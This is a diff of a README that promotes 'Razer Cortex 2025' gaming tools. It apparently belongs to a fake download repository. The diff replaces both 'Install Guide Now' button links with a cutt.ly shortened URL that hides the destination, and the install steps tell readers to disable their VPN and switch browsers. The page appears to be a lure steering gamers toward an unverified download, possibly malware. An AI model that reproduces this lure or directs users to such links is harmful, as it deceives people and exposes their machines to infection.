@@ -5,7 +5,7 @@
 
 🌟 Supercharge your gaming with **Razer Cortex 2025**! This repository is your go-to source for tutorials, tools, and tips to explore Razer Cortex’s advanced features for optimizing PC performance, boosting FPS, and enhancing gameplay in popular titles like Valorant, Fortnite, and CS2. Get started with accessible gaming resources and join our community of gamers in 2025!  
 
-<a href="https://game-boost-hub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/frNtZUD9" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
@@ -34,7 +34,7 @@ Get Razer Cortex 2025 up and running with these easy steps to elevate your gamin
    - Disable your VPN to avoid connection issues.  
    - Switch browsers (e.g., Chrome, Firefox, or Edge) for a smoother download.  
 
-<a href="https://game-boost-hub.github.io/.github/" target="_blank">
+<a href="https://cutt.ly/frNtZUD9" target="_blank">
   <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
